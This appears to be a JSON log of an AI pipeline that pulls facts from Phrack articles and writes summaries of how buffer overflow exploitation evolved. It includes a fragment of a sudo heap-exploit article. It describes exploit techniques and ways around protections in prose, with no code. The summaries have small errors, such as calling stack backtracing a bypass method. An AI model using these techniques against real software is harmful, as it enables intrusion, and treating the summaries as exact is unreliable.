comes from line[4] if there is no SPACE character among the first MAXSYSLOGLEN bytes after p. tmp is then equal to (p + MAXSYSLOGLEN). -- If p and tmp are both located within the msg buffer, there is no possible memory corruption, because overwriting the tmp character located within a buffer returned by malloc is a perfectly legal action. -- If p is located within the msg buffer and tmp is located outside the msg buffer... this is impossible because the NUL terminator at the end of the msg buffer, placed between p and tmp, prevents do_syslog() from successfully passing the test[2] (and the code at line[8] is not interesting because it performs no write operation). Moreover, if the test[2] fails once it will always fail, because p will never be modifed again and strlen(p) will therefore stay less than or equal to MAXSYSLOGLEN, forcing do_syslog() to run the code at line[8] again and again, as long as count does not reach (strlen(msg)/MAXSYSLOGLEN + 1). -- If p and tmp are both located outside the msg buffer, p points to the first SPACE character encountered after the end of the msg string because it was pushed outside the msg buffer by the loop[7]. If the Sudo exploit exclusively relies on the content of the msg buffer, it cannot control p because it cannot control the occurrence of SPACE characters after the end of the msg string. Consequently, it cannot control tmp, which points to the place where the NUL byte is written, because tmp depends on p. Moreover, after p was pushed outside the msg buffer by the loop[7], there should be no NUL character between p and (p + MAXSYSLOGLEN) in order to successfully pass the test[2]. The Sudo exploit should once again rely on the content of the memory after msg. ----[ 2.4 - Temporary conclusion ]-------------------------------------- The Sudo exploit should: - overwrite a byte of the boundary tag located after the msg buffer with the NUL byte... it should therefore control the content of the",
                      "hash": "935d7ba1c763c863e07287a5774bc29442014d65c9759d1e30eb477ab9b35747",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8128548860549927
                    }
                  ]
                }
              ],
              "error": null
            }
          ]
        ]
      ],
      [
        ["chat", "MODEL_FACTS"],
        [
          [
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"This article demonstrates that it is possible to exploit a buffer overflow vulnerability even under the worst conditions, like when the target buffer can only be overflowed by one byte.\",\n    \"A vulnerable suid program called 'suid' is used as an example to demonstrate the exploitation of a one-byte buffer overflow.\",\n    \"The overflowing byte will overwrite the saved frame pointer (saved_ebp), which was pushed into the stack at the beginning of the function.\",\n    \"By altering the saved frame pointer, the processor can be tricked into executing arbitrary code and changing the execution flow of the program.\",\n    \"The example used in the article demonstrates how to exploit a one-byte buffer overflow by executing shellcode.\",\n    \"In order to exploit the program, the address of the overflowed buffer and the address of the pointer to the shellcode need to be determined.\",\n    \"A fake exploit is written to reproduce the context in which the vulnerable process will be exploited.\",\n    \"The article shows the process of exploiting the one-byte buffer overflow vulnerability in the example program.\"\n  ],\n  \"summary\": \"This article demonstrates the exploitation of a one-byte buffer overflow vulnerability using a vulnerable suid program as an example, discussing how to alter the saved frame pointer and execute arbitrary code to change the program's execution flow.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"A buffer overflow is the result of stuffing more data into a buffer than it can handle.\",\n    \"In a buffer overflow, the return address of a function can be overwritten, allowing for the execution of arbitrary code.\",\n    \"The stack is used to dynamically allocate local variables, pass parameters to functions, and return values from functions.\",\n    \"The stack consists of logical stack frames that are pushed when calling a function and popped when returning.\",\n    \"A stack frame contains parameters to a function, its local variables, and data necessary to recover the previous stack frame.\",\n    \"strcpy() is an example of a function that can cause a buffer overflow, as it copies a supplied string without bounds checking.\",\n    \"A segmentation violation occurs when the return address is overwritten with an address outside of the process address space.\",\n    \"Example: By adding 12 to buffer1[]'s address in example3.c, the return address is overwritten, allowing the execution of arbitrary code.\"\n  ],\n  \"summary\": \"This document explains how buffer overflows work, how they can be exploited to execute arbitrary code, and provides examples of such exploits.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"Title: phrack-55-15\",\n    \"Date: 09.09.99\",\n    \"Author: dark spyrit AKA Barnaby Jack\",\n    \"Topic: Win32 Buffer Overflows (Location, Exploitation, and Prevention)\",\n    \"The document discusses the process of exploiting and preventing buffer overflows in Win32 programs.\",\n    \"The example used in the document is Seattle Labs mail server (3.2.3113).\",\n    \"Tools mentioned: Interactive Disassembler, SoftIce, PE Dump, PS Edit, TASM 5.0.\",\n    \"The document assumes the reader has a general knowledge of Assembler, Windows programming, Portable Executable structure, and buffer overflows.\"\n  ],\n  \"summary\": \"The document provides a detailed example of exploiting and preventing buffer overflows in Win32 programs, using Seattle Labs mail server as a case study, but does not provide historical information on the evolution of buffer overflow techniques.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"In this document, there is a description of techniques to bypass 3rd party Windows buffer overflow protection.\",\n    \"Stack backtracing is the most popular technique used to detect shellcode execution.\",\n    \"Buffer overflow protection technologies (BOPT) can be hooked in userland or kernel.\",\n    \"Kernel Host Intrusion Prevention Systems (HIPS) use stack backtracing to locate the original caller of a system call.\",\n    \"Faking stack frames can be used to bypass buffer overflow detectors.\",\n    \"Userland hooks can be bypassed using various techniques, such as calling different versions of API functions, calling functions in ntdll.dll directly, and calling system calls directly.\",\n    \"Inline function hooking is used by some buffer overflow protection systems, and can be bypassed by testing for signatures before calling a function.\",\n    \"The document does not provide historical data on the evolution of buffer overflow techniques.\"\n  ],\n  \"summary\": \"This document describes various techniques to bypass 3rd party Windows buffer overflow protection, but does not provide historical data on the evolution of buffer overflow techniques.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"Phrack Magazine Volume 0xa Issue 0x38 05.01.2000 0x0e[0x10] discusses taking advantage of non-terminated adjacent memory spaces.\",\n    \"This article details the hazards of non-terminated buffers (specifically non-terminated strings) and their potential impact on the security of an application.\",\n    \"The issue arises from the fact that many functions that a programmer may take to be safe and/or 'magic bullets' against buffer overflows do not automatically terminate strings/buffers with a NULL.\",\n    \"An example of a common overflow is provided, where the programmer assumes the data being copied will fit into the buffer.\",\n    \"To prevent overflow, programmers may use strncpy() to ensure they only copy as much data as there is buffer space.\",\n    \"The article explains a scenario where a programmer uses strncpy() in main() and assumes the data is clean when it reaches print_error().\",\n    \"Exploitation of this scenario is different than a traditional single-buffer overrun, requiring the use of buf1 and buf2 in tandem.\",\n    \"The article emphasizes that the fault lies not in the library functions or the C programming language, but in the lack of understanding and precautions taken by programmers.\"\n  ],\n  \"summary\": \"The article discusses the hazards of non-terminated buffers and their potential impact on application security, providing examples and explaining how exploitation of this scenario differs from traditional single-buffer overruns.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"The technique explained in the document is an excellent way to take control of the target process, which could have been easily used in the Linux version of the exploit.\",\n    \"The main advantage of this method is that it does not use the magic of voodoo, so it can help bypass the security checks done by the malloc code.\",\n    \"The process involves filling the heap to put it in a predictable state, placing a structure containing function pointers behind the buffer that can be overflowed, and then rewriting functions pointers.\",\n    \"By repeatedly sending large buffers containing the shellcode, it ensures that the shellcode will be available at a high address in the heap.\",\n    \"The function 'Gzip-stream' is called to allocate an array of function pointers right inside the memory hole, which will be located right after the buffer that is going to overflow.\",\n    \"The overflow is triggered, and a function pointer is overwritten with the address of the shellcode.\",\n    \"Numerous entries containing NOPs and shellcode are added to fill the higher addresses of the heap with the shellcode.\",\n    \"The zflush(1) function is called to end the gziped-stream and trigger an overwritten function pointer, which retrieves a shell.\"\n  ],\n  \"summary\": \"The document explains a technique used to exploit FreeBSD, which involves filling the heap, placing a structure containing function pointers behind the buffer, and rewriting functions pointers to take control of the target process.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"StackGuard is a compiler technique that virtually eliminates buffer overflow vulnerabilities with modest performance penalties.\",\n    \"StackGuard places a 'canary' word next to the return address on the stack. If the canary word has been altered when the function returns, a stack smashing attack has been attempted, and the program responds by emitting an intruder alert into syslog, and then halts.\",\n    \"StackGuard offers two techniques to prevent canary spoofing: 'terminator' and 'random'. A terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff). A random canary is chosen at random at the time the program execs.\",\n    \"StackShield uses a different technique, creating a separate stack to store a copy of the function's return address. The code at the function prolog copies the return address to special table, and then at the epilog, it copies it back to the stack.\",\n    \"An attacker can bypass StackGuard protection using buffer overflows to alter other pointers in the program besides the return address, such as function pointers and longjmp buffers.\",\n    \"The XOR Random Canary defense is a remediation against certain hacks. It involves XORing the random canary with the return address, effectively encrypting the return address with the random canary for the function.\",\n    \"A vulnerable overflow can be exploited when the program exits via exit() by overwriting the fnlist structure that holds functions registered via atexit(3) or on_exit(3).\",\n    \"Neither StackGuard nor StackShield can protect against an attack that overwrites the canary and calls exit(), but logs will be generated.\"\n  ],\n  \"summary\": \"The document discusses the evolution of techniques to protect against buffer overflows, including StackGuard and StackShield, as well as methods to bypass these protections.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"The 'Heap Spray' technique involves filling the heap with large amounts of memory containing nop sleds and the appropriate shellcode, allowing for a predictable memory address for the 'primitive 4-byte overwrite'.\",\n    \"The 'Heap Feng Shui' technique involves defragmenting the Heap by filling the holes, creating holes in the upper controlled zone and then creating the buffer to overflow in one of these holes, knowing that it will be adjacent to one of the exploiter's controlled buffers.\"\n  ],\n  \"summary\": \"The document mentions two techniques, Heap Spray and Heap Feng Shui, used to create buffer overflows by manipulating the heap's memory allocations and organization.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"Exploitation of security vulnerabilities has greatly increased in difficulty since the days of the Slammer worm.\",\n    \"Many exploitation mitigations were focused on the Windows heap, such as Safe Unlinking and Heap Chunk header cookies in Windows XP Service Pack 2.\",\n    \"Safe Linking, expanded Encoded Chunk headers, Terminate on Corruption, and many others were implemented in Windows Vista/7.\",\n    \"The widely deployed implementation of anti-exploitation technologies has made gaining code execution from vulnerabilities much more expensive.\",\n    \"Forcing the attacker to acquire more knowledge and spend expansive amounts of research time has made exploiting these vulnerabilities increasingly difficult.\",\n    \"The IIS 7.5 exploit example shows that an 'impossible to exploit' vulnerability can be leveraged for code execution with proper knowledge and sufficient time.\",\n    \"In-depth knowledge of the underlying operating system usually proves to be invaluable information when writing exploits.\",\n    \"The FreeEntryOffset Overwrite Technique was used in the IIS 7.5 exploit due to the limited ability of the attacker to control the contents of the overflow.\"\n  ],\n  \"summary\": \"Buffer overflow techniques have evolved over time due to exploitation mitigations implemented in operating systems, forcing attackers to acquire more knowledge, spend more time on research, and use techniques like the FreeEntryOffset Overwrite Technique.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"The document discusses a technique to exploit buffer overflows by overwriting the VTABLE and executing shellcode.\",\n    \"The technique involves placing the shellcode right before the VPTR in the buffer.\",\n    \"The buffer structure is explained, including the usage of S, V, B, and C bytes.\",\n    \"A BufferOverflow() function is provided and explained, which receives 3 parameters: BufferAddress, NAddress, and VPTROffset.\",\n    \"The example code demonstrates how to call the BufferOverflow() function and exploit a buffer overflow vulnerability in a given program.\",\n    \"By replacing the simple CCh code with a shellcode, more interesting results can be achieved, especially if the program is suid.\"\n  ],\n  \"summary\": \"The document demonstrates a technique for exploiting buffer overflow vulnerabilities by overwriting the VTABLE and executing shellcode.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"Integer overflow and integer sign vulnerabilities are now common knowledge.\",\n    \"This has led to increased exploitation of integer-related vulnerabilities.\",\n    \"A gcc patch is presented to demonstrate the feasibility of detecting integer vulnerabilities exploitations.\",\n    \"There is an ambiguous interpretation of integer inputs at different parts of the code, which can lead to vulnerabilities.\",\n    \"The root cause for these vulnerabilities is insufficient input validation for integer type input.\",\n    \"Table 1 in the document provides a sample of integer vulnerabilities reported during 2002.\",\n    \"By validating the loop bounds before its execution, it is possible to detect and prevent integer vulnerability exploitation.\",\n    \"The gcc patch, called Big Loop Integer Protection (blip), adds security checks before any 'count loop' to protect applications from integer exploits.\"\n  ],\n  \"summary\": \"The document discusses the evolution of buffer overflow techniques due to increased exploitation of integer-related vulnerabilities, and provides a gcc patch called Big Loop Integer Protection (blip) for detecting and preventing such vulnerabilities.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [],\n  \"summary\": \"The document does not provide information on the evolution of techniques to create buffer overflows.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [],\n  \"summary\": \"No information about the evolution of buffer overflow techniques is provided in this document.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"The paper documents a rare, but none-the less interesting bug in variable sized arrays in C.\",\n    \"This condition appears when a user supplied length is passed via a parameter to a variable declaration in a function.\",\n    \"As a result of this, an attacker may be able to \\\"shift\\\" the stack pointer to point it to somewhere unexpected, such as above the stack pointer, or somewhere else like the Global Offset Table.\",\n    \"The C99 standard allows for variable-length array declaration.\",\n    \"There is some rounding done on the supplied value, thus meaning small negative values (-15 > -1) and small values (1 - 15) will become 0.\",\n    \"When the supplied value is -16 or less, then it will be possible to move the stack pointer backwards (closer to the top of the stack).\",\n    \"In order for an architecture / Operating System to be exploitable, the architecture needs to support having a stack which can be moved about.\",\n    \"If the stack contains embedded flow control information, such as saved return addresses, it makes it significantly easier to exploit, and partially less dependant on what value the stack pointer contains.\"\n  ],\n  \"summary\": \"This document discusses an interesting bug in variable sized arrays in C, which can be exploited to shift the stack pointer and create buffer overflows.\"\n}"
                }
              },
              "error": null
            },
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "{\n  \"facts\": [\n    \"In the document, a segmentation violation issue is discussed in the do_syslog() function of Sudo, which is caused by the loop not checking for NUL characters and pushing the pointer way after the end of the NUL terminated character string.\",\n    \"The document mentions that if a Sudo exploit corrupts the boundary tag during the execution of do_syslog() and if syslog(3) uses one of the malloc functions, it could lead to execution of arbitrary code.\",\n    \"The document focuses on Linux/Intel systems and details the vulnerable function and explains why a precise knowledge of how malloc works internally is needed in order to exploit it.\",\n    \"The document describes the functioning of the memory allocator used by the GNU C Library (Doug Lea's Malloc) from the attacker's point of view.\",\n    \"The Sudo exploit should overwrite a byte of the boundary tag located after the msg buffer with the NUL byte and control the content of the memory after msg.\",\n    \"The document presents a working exploit for Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1.\"\n  ],\n  \"summary\": \"The document discusses a segmentation violation issue in the do_syslog() function of Sudo and the exploitation of this vulnerability by precisely understanding the inner workings of malloc and corrupting heap structures.\"\n}"
                }
              },
              "error": null
            }
          ]
        ]
      ],
      [["reduce", "LOOP"], [[{ "value": null, "error": null }]]],
      [
        ["code", "FINAL_CONTENT"],
        [
          [
            {
              "value": "TITLE: phrack-55-8\nDATE: 1999-09-09\nFACTS:\n- This article demonstrates that it is possible to exploit a buffer overflow vulnerability even under the worst conditions, like when the target buffer can only be overflowed by one byte.\n- A vulnerable suid program called 'suid' is used as an example to demonstrate the exploitation of a one-byte buffer overflow.\n- The overflowing byte will overwrite the saved frame pointer (saved_ebp), which was pushed into the stack at the beginning of the function.\n- By altering the saved frame pointer, the processor can be tricked into executing arbitrary code and changing the execution flow of the program.\n- The example used in the article demonstrates how to exploit a one-byte buffer overflow by executing shellcode.\n- In order to exploit the program, the address of the overflowed buffer and the address of the pointer to the shellcode need to be determined.\n- A fake exploit is written to reproduce the context in which the vulnerable process will be exploited.\n- The article shows the process of exploiting the one-byte buffer overflow vulnerability in the example program.\nTITLE: phrack-49-14\nDATE: 1996-11-08\nFACTS:\n- A buffer overflow is the result of stuffing more data into a buffer than it can handle.\n- In a buffer overflow, the return address of a function can be overwritten, allowing for the execution of arbitrary code.\n- The stack is used to dynamically allocate local variables, pass parameters to functions, and return values from functions.\n- The stack consists of logical stack frames that are pushed when calling a function and popped when returning.\n- A stack frame contains parameters to a function, its local variables, and data necessary to recover the previous stack frame.\n- strcpy() is an example of a function that can cause a buffer overflow, as it copies a supplied string without bounds checking.\n- A segmentation violation occurs when the return address is overwritten with an address outside of the process address space.\n- Example: By adding 12 to buffer1[]'s address in example3.c, the return address is overwritten, allowing the execution of arbitrary code.\nTITLE: phrack-55-15\nDATE: 1999-09-09\nFACTS:\n- Title: phrack-55-15\n- Date: 09.09.99\n- Author: dark spyrit AKA Barnaby Jack\n- Topic: Win32 Buffer Overflows (Location, Exploitation, and Prevention)\n- The document discusses the process of exploiting and preventing buffer overflows in Win32 programs.\n- The example used in the document is Seattle Labs mail server (3.2.3113).\n- Tools mentioned: Interactive Disassembler, SoftIce, PE Dump, PS Edit, TASM 5.0.\n- The document assumes the reader has a general knowledge of Assembler, Windows programming, Portable Executable structure, and buffer overflows.\nTITLE: phrack-62-5\nDATE: 2004-07-13\nFACTS:\n- In this document, there is a description of techniques to bypass 3rd party Windows buffer overflow protection.\n- Stack backtracing is the most popular technique used to detect shellcode execution.\n- Buffer overflow protection technologies (BOPT) can be hooked in userland or kernel.\n- Kernel Host Intrusion Prevention Systems (HIPS) use stack backtracing to locate the original caller of a system call.\n- Faking stack frames can be used to bypass buffer overflow detectors.\n- Userland hooks can be bypassed using various techniques, such as calling different versions of API functions, calling functions in ntdll.dll directly, and calling system calls directly.\n- Inline function hooking is used by some buffer overflow protection systems, and can be bypassed by testing for signatures before calling a function.\n- The document does not provide historical data on the evolution of buffer overflow techniques.\nTITLE: phrack-56-14\nDATE: 2000-01-05\nFACTS:\n- Phrack Magazine Volume 0xa Issue 0x38 05.01.2000 0x0e[0x10] discusses taking advantage of non-terminated adjacent memory spaces.\n- This article details the hazards of non-terminated buffers (specifically non-terminated strings) and their potential impact on the security of an application.\n- The issue arises from the fact that many functions that a programmer may take to be safe and/or 'magic bullets' against buffer overflows do not automatically terminate strings/buffers with a NULL.\n- An example of a common overflow is provided, where the programmer assumes the data being copied will fit into the buffer.\n- To prevent overflow, programmers may use strncpy() to ensure they only copy as much data as there is buffer space.\n- The article explains a scenario where a programmer uses strncpy() in main() and assumes the data is clean when it reaches print_error().\n- Exploitation of this scenario is different than a traditional single-buffer overrun, requiring the use of buf1 and buf2 in tandem.\n- The article emphasizes that the fault lies not in the library functions or the C programming language, but in the lack of understanding and precautions taken by programmers.\nTITLE: phrack-64-15\nDATE: 2007-05-27\nFACTS:\n- The technique explained in the document is an excellent way to take control of the target process, which could have been easily used in the Linux version of the exploit.\n- The main advantage of this method is that it does not use the magic of voodoo, so it can help bypass the security checks done by the malloc code.\n- The process involves filling the heap to put it in a predictable state, placing a structure containing function pointers behind the buffer that can be overflowed, and then rewriting functions pointers.\n- By repeatedly sending large buffers containing the shellcode, it ensures that the shellcode will be available at a high address in the heap.\n- The function 'Gzip-stream' is called to allocate an array of function pointers right inside the memory hole, which will be located right after the buffer that is going to overflow.\n- The overflow is triggered, and a function pointer is overwritten with the address of the shellcode.\n- Numerous entries containing NOPs and shellcode are added to fill the higher addresses of the heap with the shellcode.\n- The zflush(1) function is called to end the gziped-stream and trigger an overwritten function pointer, which retrieves a shell.\nTITLE: phrack-56-5\nDATE: 2000-01-05\nFACTS:\n- StackGuard is a compiler technique that virtually eliminates buffer overflow vulnerabilities with modest performance penalties.\n- StackGuard places a 'canary' word next to the return address on the stack. If the canary word has been altered when the function returns, a stack smashing attack has been attempted, and the program responds by emitting an intruder alert into syslog, and then halts.\n- StackGuard offers two techniques to prevent canary spoofing: 'terminator' and 'random'. A terminator canary contains NULL(0x00), CR (0x0d), LF (0x0a) and EOF (0xff). A random canary is chosen at random at the time the program execs.\n- StackShield uses a different technique, creating a separate stack to store a copy of the function's return address. The code at the function prolog copies the return address to special table, and then at the epilog, it copies it back to the stack.\n- An attacker can bypass StackGuard protection using buffer overflows to alter other pointers in the program besides the return address, such as function pointers and longjmp buffers.\n- The XOR Random Canary defense is a remediation against certain hacks. It involves XORing the random canary with the return address, effectively encrypting the return address with the random canary for the function.\n- A vulnerable overflow can be exploited when the program exits via exit() by overwriting the fnlist structure that holds functions registered via atexit(3) or on_exit(3).\n- Neither StackGuard nor StackShield can protect against an attack that overwrites the canary and calls exit(), but logs will be generated.\nTITLE: phrack-67-8\nDATE: 2010-11-17\nFACTS:\n- The 'Heap Spray' technique involves filling the heap with large amounts of memory containing nop sleds and the appropriate shellcode, allowing for a predictable memory address for the 'primitive 4-byte overwrite'.\n- The 'Heap Feng Shui' technique involves defragmenting the Heap by filling the holes, creating holes in the upper controlled zone and then creating the buffer to overflow in one of these holes, knowing that it will be adjacent to one of the exploiter's controlled buffers.\nTITLE: phrack-68-12\nDATE: 2012-04-14\nFACTS:\n- Exploitation of security vulnerabilities has greatly increased in difficulty since the days of the Slammer worm.\n- Many exploitation mitigations were focused on the Windows heap, such as Safe Unlinking and Heap Chunk header cookies in Windows XP Service Pack 2.\n- Safe Linking, expanded Encoded Chunk headers, Terminate on Corruption, and many others were implemented in Windows Vista/7.\n- The widely deployed implementation of anti-exploitation technologies has made gaining code execution from vulnerabilities much more expensive.\n- Forcing the attacker to acquire more knowledge and spend expansive amounts of research time has made exploiting these vulnerabilities increasingly difficult.\n- The IIS 7.5 exploit example shows that an 'impossible to exploit' vulnerability can be leveraged for code execution with proper knowledge and sufficient time.\n- In-depth knowledge of the underlying operating system usually proves to be invaluable information when writing exploits.\n- The FreeEntryOffset Overwrite Technique was used in the IIS 7.5 exploit due to the limited ability of the attacker to control the contents of the overflow.\nTITLE: phrack-56-8\nDATE: 2000-01-05\nFACTS:\n- The document discusses a technique to exploit buffer overflows by overwriting the VTABLE and executing shellcode.\n- The technique involves placing the shellcode right before the VPTR in the buffer.\n- The buffer structure is explained, including the usage of S, V, B, and C bytes.\n- A BufferOverflow() function is provided and explained, which receives 3 parameters: BufferAddress, NAddress, and VPTROffset.\n- The example code demonstrates how to call the BufferOverflow() function and exploit a buffer overflow vulnerability in a given program.\n- By replacing the simple CCh code with a shellcode, more interesting results can be achieved, especially if the program is suid.\nTITLE: phrack-60-9\nDATE: 2002-12-28\nFACTS:\n- Integer overflow and integer sign vulnerabilities are now common knowledge.\n- This has led to increased exploitation of integer-related vulnerabilities.\n- A gcc patch is presented to demonstrate the feasibility of detecting integer vulnerabilities exploitations.\n- There is an ambiguous interpretation of integer inputs at different parts of the code, which can lead to vulnerabilities.\n- The root cause for these vulnerabilities is insufficient input validation for integer type input.\n- Table 1 in the document provides a sample of integer vulnerabilities reported during 2002.\n- By validating the loop bounds before its execution, it is possible to detect and prevent integer vulnerability exploitation.\n- The gcc patch, called Big Loop Integer Protection (blip), adds security checks before any 'count loop' to protect applications from integer exploits.\nTITLE: phrack-63-14\nDATE: 2005-01-08\nFACTS:\n- The paper documents a rare, but none-the less interesting bug in variable sized arrays in C.\n- This condition appears when a user supplied length is passed via a parameter to a variable declaration in a function.\n- As a result of this, an attacker may be able to \"shift\" the stack pointer to point it to somewhere unexpected, such as above the stack pointer, or somewhere else like the Global Offset Table.\n- The C99 standard allows for variable-length array declaration.\n- There is some rounding done on the supplied value, thus meaning small negative values (-15 > -1) and small values (1 - 15) will become 0.\n- When the supplied value is -16 or less, then it will be possible to move the stack pointer backwards (closer to the top of the stack).\n- In order for an architecture / Operating System to be exploitable, the architecture needs to support having a stack which can be moved about.\n- If the stack contains embedded flow control information, such as saved return addresses, it makes it significantly easier to exploit, and partially less dependant on what value the stack pointer contains.\nTITLE: phrack-57-8\nDATE: 2001-08-11\nFACTS:\n- In the document, a segmentation violation issue is discussed in the do_syslog() function of Sudo, which is caused by the loop not checking for NUL characters and pushing the pointer way after the end of the NUL terminated character string.\n- The document mentions that if a Sudo exploit corrupts the boundary tag during the execution of do_syslog() and if syslog(3) uses one of the malloc functions, it could lead to execution of arbitrary code.\n- The document focuses on Linux/Intel systems and details the vulnerable function and explains why a precise knowledge of how malloc works internally is needed in order to exploit it.\n- The document describes the functioning of the memory allocator used by the GNU C Library (Doug Lea's Malloc) from the attacker's point of view.\n- The Sudo exploit should overwrite a byte of the boundary tag located after the msg buffer with the NUL byte and control the content of the memory after msg.\n- The document presents a working exploit for Red Hat Linux/Intel 6.2 (Zoot) sudo-1.6.1-1.\n",
              "error": null
            }
          ]
        ]
      ],
      [
        ["chat", "MODEL_SHORT"],
        [
          [
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "Buffer overflow exploitation techniques have evolved over time, with early examples focused on overwriting return addresses and exploiting vulnerable functions such as strcpy() without bounds checking [1]. As protection mechanisms were introduced, attackers started employing more advanced techniques, such as heap spraying, heap feng shui, and overwriting VTABLEs to execute shellcode [6][7]. Additionally, the exploitation of integer-related vulnerabilities and the manipulation of variable-sized arrays in C have contributed to the increased complexity of buffer overflow attacks [12][13].\n\nThe introduction of protection mechanisms, such as StackGuard and StackShield, led to further advancements in bypassing techniques. Attackers developed methods to fake stack frames and bypass userland hooks by calling different versions of API functions, calling functions in ntdll.dll directly, and calling system calls directly [4]. Despite these protections, attackers continue to find new ways to exploit buffer overflows, demonstrating that a deep understanding of the underlying operating system and extensive research time are essential for successful exploitation [11]. As a result, the evolution of buffer overflow techniques has been a continuous arms race between attackers and defenders, with each side adapting to the innovations of the other.\n\nReferences:\n[1] phrack-49-14\n[4] phrack-62-5\n[6] phrack-56-8\n[7] phrack-67-8\n[11] phrack-68-12\n[12] phrack-60-9\n[13] phrack-63-14"
                }
              },
              "error": null
            }
          ]
        ]
      ],
      [
        ["chat", "MODEL_1PAGER"],
        [
          [
            {
              "value": {
                "message": {
                  "role": "assistant",
                  "content": "# Introduction\nBuffer overflow techniques have evolved over time, with new methods and strategies being developed to bypass security measures and exploit vulnerabilities in software. This executive summary covers the evolution of buffer overflow techniques, highlighting key milestones and techniques that have shaped the landscape of exploiting buffer overflows.\n\n# Early Techniques\nIn the early days of buffer overflow exploitation, simple techniques such as overwriting the return address of a function were used [1]. The strcpy() function, which copies a supplied string without bounds checking, was an example of a function that could cause a buffer overflow [1]. As mitigations against buffer overflows were introduced, attackers adapted their techniques, including overwriting the VTABLE and executing shellcode [12].\n\n# StackGuard and StackShield\nTo counter buffer overflow attacks, StackGuard and StackShield were introduced [6]. StackGuard placed a 'canary' word next to the return address on the stack to detect stack smashing attacks [6]. StackShield used a separate stack to store a copy of the function's return address [6]. However, attackers found ways to bypass these protections by altering other pointers in the program besides the return address, such as function pointers and longjmp buffers [6].\n\n# Heap-based Techniques\nAs heap-based vulnerabilities became more prevalent, attackers developed techniques such as Heap Spray and Heap Feng Shui [7]. Heap Spray involved filling the heap with large amounts of memory containing nop sleds and shellcode to predict the memory address for the 'primitive 4-byte overwrite' [7]. Heap Feng Shui was a technique to defragment the heap by filling holes and creating controlled buffers adjacent to the buffer that would be overflowed [7].\n\n# Windows-Based Techniques\nBuffer overflow exploitation and prevention also evolved in the Windows environment with Win32 buffer overflows [3]. Techniques to bypass Windows buffer overflow protection, such as stack backtracing, fake stack frames, userland hooks, and inline function hooking were developed [4]. As Windows implemented more anti-exploitation technologies, attackers required more in-depth knowledge of the underlying operating system and extensive research time to exploit vulnerabilities [8].\n\n# Integer-Related Vulnerabilities\nInteger overflow and integer sign vulnerabilities became more common, leading to increased exploitation of integer-related vulnerabilities [9]. A gcc patch called Big Loop Integer Protection (blip) was introduced to add security checks before 'count loops' to protect applications from integer exploits [9].\n\n# Variable-Length Array Exploitation\nWith the introduction of the C99 standard allowing variable-length array declaration, a rare bug in variable-sized arrays in C was discovered, which could be exploited by shifting the stack pointer [10]. This required an architecture that supports a movable stack and embedded flow control information in the stack for successful exploitation [10].\n\n# Evolving Exploitation Techniques\nOver time, attackers have adapted their techniques to exploit vulnerabilities in various systems, such as Sudo [13], Linux [11], and IIS 7.5 [8]. These exploits often require a deep understanding of the target system, memory allocators, and the specific vulnerability being exploited [8][11][13].\n\n# Conclusion\nBuffer overflow techniques have evolved significantly over time, with attackers developing new methods to bypass security measures and exploit software vulnerabilities. Despite the introduction of various protection systems, attackers continue to find ways to exploit software, requiring constant vigilance and adaptation from security professionals.\n\nReferences:\n[1] phrack-49-14\n[3] phrack-55-15\n[4] phrack-62-5\n[6] phrack-56-5\n[7] phrack-67-8\n[8] phrack-68-12\n[9] phrack-60-9\n[10] phrack-63-14\n[11] phrack-56-14\n[12] phrack-56-8\n[13] phrack-57-8"
                }
              },
              "error": null
            }
          ]
        ]
      ]
    ],
    "specification_hash": "c49bec796418080eb12d882e21ebd40ac9f43719cb44471d1dc01bf0244543df",
    "results": [
      [
        {
          "value": {
            "message": {
              "role": "assistant",
              "content": "# Introduction\nBuffer overflow techniques have evolved over time, with new methods and strategies being developed to bypass security measures and exploit vulnerabilities in software. This executive summary covers the evolution of buffer overflow techniques, highlighting key milestones and techniques that have shaped the landscape of exploiting buffer overflows.\n\n# Early Techniques\nIn the early days of buffer overflow exploitation, simple techniques such as overwriting the return address of a function were used [1]. The strcpy() function, which copies a supplied string without bounds checking, was an example of a function that could cause a buffer overflow [1]. As mitigations against buffer overflows were introduced, attackers adapted their techniques, including overwriting the VTABLE and executing shellcode [12].\n\n# StackGuard and StackShield\nTo counter buffer overflow attacks, StackGuard and StackShield were introduced [6]. StackGuard placed a 'canary' word next to the return address on the stack to detect stack smashing attacks [6]. StackShield used a separate stack to store a copy of the function's return address [6]. However, attackers found ways to bypass these protections by altering other pointers in the program besides the return address, such as function pointers and longjmp buffers [6].\n\n# Heap-based Techniques\nAs heap-based vulnerabilities became more prevalent, attackers developed techniques such as Heap Spray and Heap Feng Shui [7]. 